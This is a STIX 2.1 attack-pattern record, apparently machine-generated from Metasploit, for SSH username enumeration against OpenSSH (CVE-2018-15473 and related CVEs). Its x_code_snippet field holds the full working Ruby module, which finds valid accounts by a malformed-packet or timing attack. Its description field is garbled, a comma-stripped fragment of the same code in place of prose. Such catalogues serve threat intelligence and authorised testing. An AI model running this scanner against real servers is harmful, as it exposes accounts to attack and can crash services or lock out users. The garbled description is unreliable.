{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6c29ad08-e643-4434-9d25-acf61d771035",
    "created": "2024-08-14T16:27:24.528616Z",
    "modified": "2024-08-14T16:27:24.52862Z",
    "name": "SSH Username Enumeration",
    "description": "Use a timing attack 'Type' => :timing_attack  ] ] 'DefaultAction' => 'Malformed Packet' 'Notes' => { 'Stability' => [ CRASH_SERVICE_DOWN # possible that a malformed packet may crash the service ] 'Reliability' => [] 'SideEffects' => [ IOC_IN_LOGS ACCOUNT_LOCKOUTS, # timing attack submits a password ]  ) )  register_options( [ Opt::Proxies Opt::RPORT(22) OptString.new('USERNAME' [false, 'Single username to test (username spray)']) OptPath.new('USER_FILE' [false, 'File containing usernames, one per line']) OptBool.new('DB_ALL_USERS' [false, 'Add all users in the current database to the list', false]) OptInt.new('THRESHOLD' [ true 'Amount of seconds needed before a user is considered ' \\ 'found (timing attack only)', 10 ]) OptBool.new('CHECK_FALSE' [false, 'Check for false positives (random username)', true]) ] )  register_advanced_options( [ OptInt.new('RETRY_NUM' [ true, 'The number of attempts to connect to a SSH server' \\ ' for each user', 3 ]) OptInt.new('SSH_TIMEOUT' [ false, 'Specify the maximum time to negotiate a SSH session' 10 ]) OptBool.new('SSH_DEBUG' [ false, 'Enable SSH debugging output (Extreme verbosity!)' false ]) ] ) end  def rport datastore['RPORT'] end  def retry_num datastore['RETRY_NUM'] end  def threshold datastore['THRESHOLD'] end  # Returns true if a nonsense username appears active. def check_false_positive(ip) user = Rex::Text.rand_text_alphanumeric(8..32) attempt_user(user, ip) == :success end  def check_user(ip, user, port) technique = action['Type']  opts = ssh_client_defaults.merge({ port: port })  # The auth method is converted into a class name for instantiation # so malformed-packet here becomes MalformedPacket from the mixin case technique when :malformed_packet opts.merge!(auth_methods: ['malformed-packet']) when :timing_attack opts.merge!( auth_methods: ['password', 'keyboard-interactive'] password: rand_pass ) end  opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']  start_time = Time.new  begin ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do Net::SSH.start(ip, user, opts) end rescue Rex::ConnectionError return :connection_error rescue Timeout::Error return :success if technique == :timing_attack rescue Net::SSH::AuthenticationFailed return :fail if technique == :malformed_packet rescue Net::SSH::Exception => e vprint_error(\"#{e.class}: #{e.message}\") end  finish_time = Time.new  case technique when :malformed_packet return :success if ssh when :timing_attack return :success if (finish_time - start_time > threshold) end  :fail end  def rand_pass Rex::Text.rand_text_english(64_000..65_000) end  def do_report(ip, user, _port) service_data = { address: ip port: rport service_name: 'ssh' protocol: 'tcp' workspace_id: myworkspace_id   credential_data = { origin_type: :service module_fullname: fullname username: user }.merge(service_data)  login_data = { core: create_credential(credential_data) status: Metasploit::Model::Login::Status::UNTRIED }.merge(service_data)  create_credential_login(login_data) end  # Because this isn't using the AuthBrute mixin, we don't have the # usual peer method def peer(rhost = nil) \"#{rhost}:#{rport} - SSH -\" end  def user_list users = []  users << datastore['USERNAME'] unless datastore['USERNAME'].blank?  if datastore['USER_FILE'] fail_with(Failure::BadConfig, 'The USER_FILE is not readable') unless File.readable?(datastore['USER_FILE']) users += File.read(datastore['USER_FILE']).split end  if datastore['DB_ALL_USERS'] if framework.db.active framework.db.creds(workspace: myworkspace.name).each do |o| users << o.public.username if o.public end else print_warning('No active DB -- The following option will be ignored: DB_ALL_USERS') end end  users.uniq end  def attempt_user(user, ip) attempt_num = 0 ret = nil  while (attempt_num <= retry_num) && (ret.nil? || (ret == :connection_error)) if attempt_num > 0 Rex.sleep(2**attempt_num) vprint_status(\"#{peer(ip)} Retrying '#{user}' due to connection error\") end  ret = check_user(ip, user, rport) attempt_num += 1 end  ret end  def show_result(attempt_result, user, ip) case attempt_result when :success print_good(\"#{peer(ip)} User '#{user}' found\") do_report(ip, user, rport) when :connection_error vprint_error(\"#{peer(ip)} User '#{user}' could not connect\") when :fail vprint_error(\"#{peer(ip)} User '#{user}' not found\") end end  def run if user_list.empty? fail_with(Failure::BadConfig, 'Please populate DB_ALL_USERS, USER_FILE, USERNAME') end  super end  def run_host(ip) print_status(\"#{peer(ip)} Using #{action.name.downcase} technique\")  if datastore['CHECK_FALSE'] print_status(\"#{peer(ip)} Checking for false positives\") if check_false_positive(ip) print_error(\"#{peer(ip)} throws false positive results. Aborting.\") return end end  users = user_list  print_status(\"#{peer(ip)} Starting scan\") users.each { |user| show_result(attempt_user(user, ip), user, ip)  end end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ssh/ssh_enumusers.rb",
            "external_id": "ssh_enumusers.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0190"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-5229"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-6210"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-15473"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2018/q3/124"
        },
        {
            "source_name": "reference",
            "url": "https://sekurak.pl/openssh-users-enumeration-cve-2018-15473/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SSH\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SSH Username Enumeration',\n        'Description' => %q{\n          This module uses a malformed packet or timing attack to enumerate users on\n          an OpenSSH server.\n\n          The default action sends a malformed (corrupted) SSH_MSG_USERAUTH_REQUEST\n          packet using public key authentication (must be enabled) to enumerate users.\n\n          On some versions of OpenSSH under some configurations, OpenSSH will return a\n          \"permission denied\" error for an invalid user faster than for a valid user,\n          creating an opportunity for a timing attack to enumerate users.\n\n          Testing note: invalid users were logged, while valid users were not. YMMV.\n        },\n        'Author' => [\n          'kenkeiras',     # Timing attack\n          'Dariusz Tytko', # Malformed packet\n          'Michal Sajdak', # Malformed packet\n          'Qualys',        # Malformed packet\n          'wvu'            # Malformed packet\n        ],\n        'References' => [\n          ['CVE', '2003-0190'],\n          ['CVE', '2006-5229'],\n          ['CVE', '2016-6210'],\n          ['CVE', '2018-15473'],\n          ['OSVDB', '32721'],\n          ['BID', '20418'],\n          ['URL', 'https://seclists.org/oss-sec/2018/q3/124'],\n          ['URL', 'https://sekurak.pl/openssh-users-enumeration-cve-2018-15473/']\n        ],\n        'License' => MSF_LICENSE,\n        'Actions' => [\n          [\n            'Malformed Packet',\n            {\n              'Description' => 'Use a malformed packet',\n              'Type' => :malformed_packet\n            }\n          ],\n          [\n            'Timing Attack',\n            {\n              'Description' => 'Use a timing attack',\n              'Type' => :timing_attack\n            }\n          ]\n        ],\n        'DefaultAction' => 'Malformed Packet',\n        'Notes' => {\n          'Stability' => [\n            CRASH_SERVICE_DOWN # possible that a malformed packet may crash the service\n          ],\n          'Reliability' => [],\n          'SideEffects' => [\n            IOC_IN_LOGS,\n            ACCOUNT_LOCKOUTS, # timing attack submits a password\n          ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::Proxies,\n        Opt::RPORT(22),\n        OptString.new('USERNAME',\n                      [false, 'Single username to test (username spray)']),\n        OptPath.new('USER_FILE',\n                    [false, 'File containing usernames, one per line']),\n        OptBool.new('DB_ALL_USERS',\n                    [false, 'Add all users in the current database to the list', false]),\n        OptInt.new('THRESHOLD',\n                   [\n                     true,\n                     'Amount of seconds needed before a user is considered ' \\\n                     'found (timing attack only)', 10\n                   ]),\n        OptBool.new('CHECK_FALSE',\n                    [false, 'Check for false positives (random username)', true])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('RETRY_NUM',\n                   [\n                     true, 'The number of attempts to connect to a SSH server' \\\n                   ' for each user', 3\n                   ]),\n        OptInt.new('SSH_TIMEOUT',\n                   [\n                     false, 'Specify the maximum time to negotiate a SSH session',\n                     10\n                   ]),\n        OptBool.new('SSH_DEBUG',\n                    [\n                      false, 'Enable SSH debugging output (Extreme verbosity!)',\n                      false\n                    ])\n      ]\n    )\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def retry_num\n    datastore['RETRY_NUM']\n  end\n\n  def threshold\n    datastore['THRESHOLD']\n  end\n\n  # Returns true if a nonsense username appears active.\n  def check_false_positive(ip)\n    user = Rex::Text.rand_text_alphanumeric(8..32)\n    attempt_user(user, ip) == :success\n  end\n\n  def check_user(ip, user, port)\n    technique = action['Type']\n\n    opts = ssh_client_defaults.merge({\n      port: port\n    })\n\n    # The auth method is converted into a class name for instantiation,\n    # so malformed-packet here becomes MalformedPacket from the mixin\n    case technique\n    when :malformed_packet\n      opts.merge!(auth_methods: ['malformed-packet'])\n    when :timing_attack\n      opts.merge!(\n        auth_methods: ['password', 'keyboard-interactive'],\n        password: rand_pass\n      )\n    end\n\n    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    start_time = Time.new\n\n    begin\n      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        Net::SSH.start(ip, user, opts)\n      end\n    rescue Rex::ConnectionError\n      return :connection_error\n    rescue Timeout::Error\n      return :success if technique == :timing_attack\n    rescue Net::SSH::AuthenticationFailed\n      return :fail if technique == :malformed_packet\n    rescue Net::SSH::Exception => e\n      vprint_error(\"#{e.class}: #{e.message}\")\n    end\n\n    finish_time = Time.new\n\n    case technique\n    when :malformed_packet\n      return :success if ssh\n    when :timing_attack\n      return :success if (finish_time - start_time > threshold)\n    end\n\n    :fail\n  end\n\n  def rand_pass\n    Rex::Text.rand_text_english(64_000..65_000)\n  end\n\n  def do_report(ip, user, _port)\n    service_data = {\n      address: ip,\n      port: rport,\n      service_name: 'ssh',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: user\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  # Because this isn't using the AuthBrute mixin, we don't have the\n  # usual peer method\n  def peer(rhost = nil)\n    \"#{rhost}:#{rport} - SSH -\"\n  end\n\n  def user_list\n    users = []\n\n    users << datastore['USERNAME'] unless datastore['USERNAME'].blank?\n\n    if datastore['USER_FILE']\n      fail_with(Failure::BadConfig, 'The USER_FILE is not readable') unless File.readable?(datastore['USER_FILE'])\n      users += File.read(datastore['USER_FILE']).split\n    end\n\n    if datastore['DB_ALL_USERS']\n      if framework.db.active\n        framework.db.creds(workspace: myworkspace.name).each do |o|\n          users << o.public.username if o.public\n        end\n      else\n        print_warning('No active DB -- The following option will be ignored: DB_ALL_USERS')\n      end\n    end\n\n    users.uniq\n  end\n\n  def attempt_user(user, ip)\n    attempt_num = 0\n    ret = nil\n\n    while (attempt_num <= retry_num) && (ret.nil? || (ret == :connection_error))\n      if attempt_num > 0\n        Rex.sleep(2**attempt_num)\n        vprint_status(\"#{peer(ip)} Retrying '#{user}' due to connection error\")\n      end\n\n      ret = check_user(ip, user, rport)\n      attempt_num += 1\n    end\n\n    ret\n  end\n\n  def show_result(attempt_result, user, ip)\n    case attempt_result\n    when :success\n      print_good(\"#{peer(ip)} User '#{user}' found\")\n      do_report(ip, user, rport)\n    when :connection_error\n      vprint_error(\"#{peer(ip)} User '#{user}' could not connect\")\n    when :fail\n      vprint_error(\"#{peer(ip)} User '#{user}' not found\")\n    end\n  end\n\n  def run\n    if user_list.empty?\n      fail_with(Failure::BadConfig, 'Please populate DB_ALL_USERS, USER_FILE, USERNAME')\n    end\n\n    super\n  end\n\n  def run_host(ip)\n    print_status(\"#{peer(ip)} Using #{action.name.downcase} technique\")\n\n    if datastore['CHECK_FALSE']\n      print_status(\"#{peer(ip)} Checking for false positives\")\n      if check_false_positive(ip)\n        print_error(\"#{peer(ip)} throws false positive results. Aborting.\")\n        return\n      end\n    end\n\n    users = user_list\n\n    print_status(\"#{peer(ip)} Starting scan\")\n    users.each { |user| show_result(attempt_user(user, ip), user, ip) }\n  end\nend\n"
}